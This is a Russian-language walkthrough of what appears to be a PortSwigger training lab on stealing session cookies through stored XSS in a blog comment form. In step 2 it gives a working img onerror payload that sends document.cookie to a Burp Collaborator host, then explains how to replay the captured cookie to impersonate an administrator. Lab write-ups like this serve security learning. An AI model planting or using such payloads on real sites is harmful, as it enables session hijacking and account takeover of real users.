![image](https://github.com/user-attachments/assets/6729768d-caae-4d96-8350-4b9f93340407)![image](https://github.com/user-attachments/assets/d9982d81-88db-4261-b408-f54eaf6bd9a5)Использование межсайтового скриптинга для кражи файлов cookie
Кража куки — традиционный способ эксплуатации XSS. Большинство веб-приложений используют куки для обработки сеансов. Вы можете использовать уязвимости межсайтового скриптинга, чтобы отправлять куки жертвы на свой домен, а затем вручную внедрять куки в браузер и выдавать себя за жертву.

На практике этот подход имеет ряд существенных ограничений:

Жертва, возможно, не вошла в систему.
Многие приложения скрывают свои файлы cookie от JavaScript с помощью этого HttpOnlyфлага.
Сеансы могут быть заблокированы по дополнительным факторам, таким как IP-адрес пользователя.
Время сеанса может истечь до того, как вы успеете его перехватить.

Эта лаборатория содержит сохраненную уязвимость XSS в функции комментариев блога. Имитируемый пользователь-жертва просматривает все комментарии после их публикации. Чтобы решить эту лабораторную работу, воспользуйтесь уязвимостью, чтобы извлечь сеансовый cookie жертвы, а затем используйте этот cookie, чтобы выдать себя за жертву.

1. Заходим на любой из постов, и внизу страницу видим форму комментария:

![image](https://github.com/user-attachments/assets/7e05df63-7a32-461d-8c65-cb8ae6870f8c)

2. Ввели в форму случайные значение, а в сам комментарий добавляем полезную нагрузку <img src=x onerror=this.src='http://burp.collaborator.url/?c='+document.cookie>

3. зайдите на вкладку Collaborator и нажмите «Poll now». Вы должны увидеть HTTP-взаимодействие. Если вы не видите никаких взаимодействий в списке, подождите несколько секунд и попробуйте еще раз.

![image](https://github.com/user-attachments/assets/42799ca7-4967-4a3c-9830-6d3c89f19847)

4. Обратите внимание на значение cookie-файла жертвы в теле POST-запроса.

![image](https://github.com/user-attachments/assets/f6106c1e-e2d0-4903-ab3d-e04cd09240ce)

5. Перезагрузите главную страницу блога, используя Burp Proxy или Burp Repeater, чтобы заменить ваш собственный сеансовый cookie на тот, который вы захватили в Burp Collaborator. Отправьте запрос на решение лабораторной работы. Чтобы доказать, что вы успешно перехватили сеанс пользователя-администратора, вы можете использовать тот же cookie в запросе на /my-accountзагрузку страницы учетной записи пользователя-администратора.

